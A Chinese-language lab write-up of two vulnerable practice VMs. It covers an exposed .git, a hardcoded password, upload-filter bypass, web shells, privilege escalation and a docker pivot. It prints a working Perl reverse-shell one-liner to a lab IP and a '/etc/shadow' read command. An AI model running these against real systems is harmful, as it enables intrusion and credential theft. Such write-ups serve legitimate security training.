> 原文链接: https://www.anquanke.com//post/id/175454 


# 渗透测试实战-eric靶机+HackInOS靶机入侵


                                阅读量   
                                **481904**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">21</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01bcda0a274e32fb0f.png)](https://p4.ssl.qhimg.com/t01bcda0a274e32fb0f.png)



## 前言

哈喽大家好！爱写靶机实战的文章的我又又来啦，最近靶机更新的有点多，小弟库存有点多，这篇写的2个靶机writeup，第一个靶机小弟拿到root_shell花了20分钟，你哪？哈哈哈….第二个靶机就比较有意思了，设计的很赞。建议大家看看。



## 靶机下载/安装

eric靶机：[https://pan.baidu.com/s/1K8oNsUstcHjc5lg7x0Yixw](https://pan.baidu.com/s/1K8oNsUstcHjc5lg7x0Yixw)

提取码：2nv9

HackInOS靶机：[https://pan.baidu.com/s/17jXHtM-bePjChNolSx9hpw](https://pan.baidu.com/s/17jXHtM-bePjChNolSx9hpw)

提取码: ywzb

[![](https://p3.ssl.qhimg.com/t019853af153e6149b7.png)](https://p3.ssl.qhimg.com/t019853af153e6149b7.png)

[![](https://p5.ssl.qhimg.com/t01f0acfef20465b0ca.png)](https://p5.ssl.qhimg.com/t01f0acfef20465b0ca.png)



## 实战

#### <a class="reference-link" name="eric%E9%9D%B6%E6%9C%BA"></a>eric靶机

靶机IP：172.16.24.91

[![](https://p5.ssl.qhimg.com/t01d298781ef909d65d.png)](https://p5.ssl.qhimg.com/t01d298781ef909d65d.png)

下面老规矩我们用nmap开路

[![](https://p3.ssl.qhimg.com/t012edd21d830a31c6b.png)](https://p3.ssl.qhimg.com/t012edd21d830a31c6b.png)

可以看到它开放了80端口，

[![](https://p3.ssl.qhimg.com/t01dd20061346dbcca5.png)](https://p3.ssl.qhimg.com/t01dd20061346dbcca5.png)

可以看到上面的提示，说博客还没开发好。。。

那我们使用目录猜解工具跑一下吧。。。

[![](https://p2.ssl.qhimg.com/t01064663a3ee1c8419.png)](https://p2.ssl.qhimg.com/t01064663a3ee1c8419.png)

看到了admin.php，我们访问一下看看

[![](https://p5.ssl.qhimg.com/t01de586bc4c11b8db2.png)](https://p5.ssl.qhimg.com/t01de586bc4c11b8db2.png)

可以看到一个非常简单的登陆界面。。。 小伙伴们是不是准备要爆破？哈哈哈 其实不建议这么做，因为密码你肯定不可能爆破出来。。。

那么下一步我们怎么办呢？小弟这里就重新开启nmap，加上一些命令再跑一遍。。

如图：

[![](https://p1.ssl.qhimg.com/t01e2af3e38291d4ac4.png)](https://p1.ssl.qhimg.com/t01e2af3e38291d4ac4.png)

可以看到有突破口了，/.git 这个相信大家都比较熟悉，平时真实工作中可能也能碰到，我们就不做废话了，直接使用lijiejie大神写的工具来完成吧。下载地址：

[https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)

[![](https://p5.ssl.qhimg.com/t01174aeca97cfbda2b.png)](https://p5.ssl.qhimg.com/t01174aeca97cfbda2b.png)

可以看到成功拿到了 admin.php 文件，我们查看一下该源码

[![](https://p1.ssl.qhimg.com/t01040f87a92d43676a.png)](https://p1.ssl.qhimg.com/t01040f87a92d43676a.png)

我们拿到了账号密码： admin – [st@mpch0rdt.ightiRu](mailto:st@mpch0rdt.ightiRu)$glo0mappL3

（密码这样的怎么破解。。。。捂脸表情）

直接登陆吧

[![](https://p5.ssl.qhimg.com/t018ca5ca499cca2134.png)](https://p5.ssl.qhimg.com/t018ca5ca499cca2134.png)

然后就上传shell，在/upload 目录下拿访问shell

[![](https://p2.ssl.qhimg.com/t01199a067eb230905e.png)](https://p2.ssl.qhimg.com/t01199a067eb230905e.png)

下一步就是反弹shell提权了

因为本靶机没有安装python，但是它安装了perl，

[![](https://p3.ssl.qhimg.com/t019cde8ed94789a37a.png)](https://p3.ssl.qhimg.com/t019cde8ed94789a37a.png)

所以本次使用perl命令为：

`perl -e 'use Socket;$i="172.16.24.81";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))`{`open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");`}`;'`

[![](https://p1.ssl.qhimg.com/t01fb87ea48f1dc5695.png)](https://p1.ssl.qhimg.com/t01fb87ea48f1dc5695.png)

然后我们拿到一个正常美观的shell，并且拿到了第一个flag，

下面我们就开始提权吧，通过上图可以看到/home/eric/目录下有backup.zip、backup.sh 2个敏感文件，且backup.sh 程序为root权限，我们还有权限修改。。我们先看一下该程序是做什么工作的，跟谈恋爱一样的 至少要了解人家是做什么工作的漂亮不漂亮 对吧，后期在扒人家。。。 呸 是后期再慢慢相互接触了解对吧，如图：

[![](https://p5.ssl.qhimg.com/t01bbbadc7a7cd57815.png)](https://p5.ssl.qhimg.com/t01bbbadc7a7cd57815.png)

可以看到这里的代码很简单，就是压缩打包我们的网站目录。。。这样套路我们就不用怀疑了，直接修改该sh文件然后静静等待让它上来自己动就行了。。

如图：

[![](https://p3.ssl.qhimg.com/t01eafe9d573dc79a3e.png)](https://p3.ssl.qhimg.com/t01eafe9d573dc79a3e.png)

注：小弟我这里当时试了很多命令，均都是连上后没办法操作或者连上就断了，最后使用的命令是 msf 生产sh文件完成的

具体操作如下截图：

[![](https://p1.ssl.qhimg.com/t013614568e9b0e7ac6.png)](https://p1.ssl.qhimg.com/t013614568e9b0e7ac6.png)

最后我们就是静静地等待。。。。

来啊 快活啊，反正有….

[![](https://p5.ssl.qhimg.com/t017d6d9dd722482c4b.png)](https://p5.ssl.qhimg.com/t017d6d9dd722482c4b.png)

[![](https://p2.ssl.qhimg.com/t0120ec8a13d68238e1.png)](https://p2.ssl.qhimg.com/t0120ec8a13d68238e1.png)

成功拿到root-flag，该靶机还是比较简单的

本靶机完！

#### <a class="reference-link" name="HackInOS%E9%9D%B6%E6%9C%BA"></a>HackInOS靶机

靶机IP：172.16.24.71

这个靶机挺不错的，小伙伴们可以先不看文章教程，自己先搞一下试试。

老规矩nmap开路，

[![](https://p1.ssl.qhimg.com/t012b0e6f4e4abaf297.png)](https://p1.ssl.qhimg.com/t012b0e6f4e4abaf297.png)

可以看到8000端口，使用了http服务，采用Wordpress搭建的。

下面nmap 也给我列出来/robots.txt 下的内容，小弟为了节省文章篇幅，就不截目录猜解的结果了，我们把目光放在 /upload.php 下

[![](https://p0.ssl.qhimg.com/t018bf4d5a53100bffe.png)](https://p0.ssl.qhimg.com/t018bf4d5a53100bffe.png)

如上图，随意上传一个php，无法成功，给了我们一个笑脸….

然后习惯性右击查看源码，如图：

[![](https://p5.ssl.qhimg.com/t0150378f5df873b572.png)](https://p5.ssl.qhimg.com/t0150378f5df873b572.png)

什么都没有。。。然后小弟就打开burp，准备看能不能饶过，结果发现了这个。。。

[![](https://p4.ssl.qhimg.com/t01a826aace20d13cc5.png)](https://p4.ssl.qhimg.com/t01a826aace20d13cc5.png)

wtf?？ 原来是写在了最后。。。 一下子粗心没下拉到最后…..

[![](https://p3.ssl.qhimg.com/t01e6d670dae3c45f18.png)](https://p3.ssl.qhimg.com/t01e6d670dae3c45f18.png)

然后我们跟进这个GitHub项目看看，发现了该php上传点的源码

[![](https://p4.ssl.qhimg.com/t01ffeb8ec5371d51ba.png)](https://p4.ssl.qhimg.com/t01ffeb8ec5371d51ba.png)

我们先来看一下该程序的判断规则是判断文件头，这里就比较简单了，在PHP马头部，加上 “GIF98” 即可绕过,成功上传。如图：

[![](https://p5.ssl.qhimg.com/t012fe1ac0d35607013.png)](https://p5.ssl.qhimg.com/t012fe1ac0d35607013.png)

但是我们访问/upload/shell名字 却没有？为什么呢？

其实大家不知道有没有注意到上面源码中的第18、20行代码呢？可以看到程序对我们上传的shell名字然后加上1-100的数字，在进行md5 加密储存。。。。

那怎么办呢？我们就写python脚本吧，如图：

[![](https://p2.ssl.qhimg.com/t01deba5d1e2040b296.png)](https://p2.ssl.qhimg.com/t01deba5d1e2040b296.png)

运行该程序后，我们就得到了一个shell名字+1-100数字合并并md5加密的字典列表，如图：

[![](https://p0.ssl.qhimg.com/t01397c43b9e1766499.png)](https://p0.ssl.qhimg.com/t01397c43b9e1766499.png)

下一步我们继续上传一个shell（注：这里有2点需要说明，1. /upload目录下的文件上传成功后会很快被清除；2.这里我自己平时用的大马shell上传成功后，输入密码无法登陆无法正常使用）

所以小弟这次使用的是 weevely 生成的php马

[![](https://p4.ssl.qhimg.com/t010dd9287e018ea14c.png)](https://p4.ssl.qhimg.com/t010dd9287e018ea14c.png)

[![](https://p4.ssl.qhimg.com/t01b812b44da7a7a93f.png)](https://p4.ssl.qhimg.com/t01b812b44da7a7a93f.png)

下一步我们使用目录猜解工具，跑一下

[![](https://p0.ssl.qhimg.com/t01fb1d729ccf1d1aa0.png)](https://p0.ssl.qhimg.com/t01fb1d729ccf1d1aa0.png)

后面使用weevely链接这个shell

[![](https://p0.ssl.qhimg.com/t01a1a61d820e0e1278.png)](https://p0.ssl.qhimg.com/t01a1a61d820e0e1278.png)

成功后，我快速切换到网站根目录下上传了一个图形化的shell大马

[![](https://p2.ssl.qhimg.com/t01ce642cb5b7acccb4.png)](https://p2.ssl.qhimg.com/t01ce642cb5b7acccb4.png)

下一步就是正常反弹shell提权了，

[![](https://p2.ssl.qhimg.com/t01b2b177c7ad0d9f40.png)](https://p2.ssl.qhimg.com/t01b2b177c7ad0d9f40.png)

我们上传提权脚本,发现了这个

[![](https://p4.ssl.qhimg.com/t01bfb18e27d9b54398.png)](https://p4.ssl.qhimg.com/t01bfb18e27d9b54398.png)

下面我们使用命令 `tail -c1G /etc/shadow` 拿到了root密码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dad1a25c1a34c679.png)

下一步我们破解一下这个密文

[![](https://p4.ssl.qhimg.com/t01b32afd64ae7faf30.png)](https://p4.ssl.qhimg.com/t01b32afd64ae7faf30.png)

得到root密码：john ，我们直接切换root，如图：

[![](https://p3.ssl.qhimg.com/t01ac92576617917e1e.png)](https://p3.ssl.qhimg.com/t01ac92576617917e1e.png)

小伙伴们肯定以为到这里就结束了？哈哈哈哈 还没呢。。。革命还未完成，同志们还得继续努力啊，那我们继续找找翻翻看有没有什么突破口吧

[![](https://p3.ssl.qhimg.com/t01c70927e1a275f95a.png)](https://p3.ssl.qhimg.com/t01c70927e1a275f95a.png)

继续继续

[![](https://p0.ssl.qhimg.com/t0170fc6ac8596116ea.png)](https://p0.ssl.qhimg.com/t0170fc6ac8596116ea.png)

172.18.0.x 网段？？？

OK 我们先使用msf拿到一个反弹shell吧，操作如图：

[![](https://p4.ssl.qhimg.com/t014834840735bfc7ec.png)](https://p4.ssl.qhimg.com/t014834840735bfc7ec.png)

下面复制这段代码，在root-shell 下运行，如图：

[![](https://p1.ssl.qhimg.com/t018d54f839ac9deddc.png)](https://p1.ssl.qhimg.com/t018d54f839ac9deddc.png)

[![](https://p1.ssl.qhimg.com/t011c517fd1ec86bfe6.png)](https://p1.ssl.qhimg.com/t011c517fd1ec86bfe6.png)

下一步添加上路由，探测一下该网段的情况吧

[![](https://p5.ssl.qhimg.com/t012303e324dd81b795.png)](https://p5.ssl.qhimg.com/t012303e324dd81b795.png)

[![](https://p5.ssl.qhimg.com/t01bceca07606c1a22b.png)](https://p5.ssl.qhimg.com/t01bceca07606c1a22b.png)

[![](https://p0.ssl.qhimg.com/t0191487f2b503edcd3.png)](https://p0.ssl.qhimg.com/t0191487f2b503edcd3.png)

可以看到172.18.0.2 端口开放了 3306 mysql服务，我们找一下网站的账号密码看能不能登陆，如图：

[![](https://p1.ssl.qhimg.com/t01ab1f91ac32ecb9d0.png)](https://p1.ssl.qhimg.com/t01ab1f91ac32ecb9d0.png)

[![](https://p1.ssl.qhimg.com/t01b2554e9208dcd3bb.png)](https://p1.ssl.qhimg.com/t01b2554e9208dcd3bb.png)

成功登陆，我们继续看看

[![](https://p3.ssl.qhimg.com/t0137b65e457fa20b9a.png)](https://p3.ssl.qhimg.com/t0137b65e457fa20b9a.png)

成功拿到md5密文，下一步就是破解该密文了，

[![](https://p5.ssl.qhimg.com/t01c9cf31c19969a9b9.png)](https://p5.ssl.qhimg.com/t01c9cf31c19969a9b9.png)

下面我们登陆ssh 账号密码：hummingbirdscyber – 123456

[![](https://p4.ssl.qhimg.com/t01df28f9dc80875bd7.png)](https://p4.ssl.qhimg.com/t01df28f9dc80875bd7.png)

成功登陆，下面我们继续探索。。。。

[![](https://p2.ssl.qhimg.com/t016e7fffd54baf00cd.png)](https://p2.ssl.qhimg.com/t016e7fffd54baf00cd.png)

发现了docker？记得前面用提权脚本探测时，也发现了docker的身影，如图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bdf514451cf2abbf.png)

我们看一下docker的运行情况

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016f8cf12d30d28e00.png)

下面我们直接以root身份，运行该docker虚拟机吧

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0138d4921f75b0d37d.png)

成功登陆，最后就是拿flag了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012b54e9250172d2e3.png)



## 结语

第一个靶机中的/.git/ 在实际工作中还是有碰到的，可能有些小伙伴会直接忽略，相信看了这篇文章，下次碰到应该也知道怎么利用了，第二个靶机个人觉得还是挺不错的，特别是flag放在docker环境下还是挺骚的。不一定以后ctf比赛中不一定会出现这种类似的情况哦。。哈哈哈哈！！ 最后祝您及家人身体健康，感谢观看！
